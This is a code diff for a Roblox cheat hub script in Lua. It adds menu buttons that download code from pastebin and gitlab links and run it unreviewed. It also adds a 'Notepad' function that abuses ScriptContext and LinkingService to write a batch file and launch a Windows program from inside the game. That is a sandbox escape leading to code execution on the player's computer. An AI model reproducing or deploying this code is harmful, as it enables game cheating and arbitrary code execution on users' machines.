@@ -3,7 +3,7 @@ getgenv().gethui = function()
 end
 -- above is SYNAPSE Z SUPPORT
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "HWID HUB V1.76", HidePremium = false, IntroText = "HWID 1.76 UPDATE", SaveConfig = true, ConfigFolder = "OrionTest"})
+local Window = OrionLib:MakeWindow({Name = "HWID HUB V1.77", HidePremium = false, IntroText = "HWID 1.77 UPDATE", SaveConfig = true, ConfigFolder = "OrionTest"})
 
 -- Tabs
 local Tab = Window:MakeTab({
@@ -125,6 +125,25 @@ local function VAPEV4()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
 end
 
+local function RCE()
+    loadstring(game:HttpGet("https://pastebin.com/raw/SxfGt30J"))() -- yes i turned it into a pastebin link, no i didnt make it. I INDENT MY CODE UNLIKE THIS PERSON
+end
+
+local function SUNC()
+    loadstring(game:HttpGet("https://gitlab.com/sens3/nebunu/-/raw/main/HummingBird8's_sUNC_yes_i_moved_to_gitlab_because_my_github_acc_got_brickedd/sUNCm0m3n7.lua"))()
+end
+
+local function Notepad()
+    local LinkingService = game:GetService("LinkingService")
+    local ScriptContext = game:GetService("ScriptContext")
+
+
+    LinkingService:OpenUrl(ScriptContext:SaveScriptProfilingData(
+	    [[START C:\WINDOWS\system32\notepad.exe]], "ok.bat")
+    )
+end
+
+
 -- Buttons
 Tab:AddButton({
     Name = "Nameless admin",
@@ -137,6 +156,27 @@ Tab:AddButton({
     Name = "Anti chat logger V2",
     Callback = function()
         A_C_L()
+    end
+})
+
+Tab:AddButton({
+    Name = "RCE Vuln checker",
+    Callback = function()
+        RCE()
+    end
+})
+
+Tab:AddButton({
+    Name = "SUNC - shows REAL unc of execs",
+    Callback = function()
+        SUNC()
+    end
+})
+
+Tab:AddButton({
+    Name = "Open notepad (ONLY WORKS ON VULNERABLE EXECS)",
+    Callback = function()
+        Notepad()
     end
 })
 
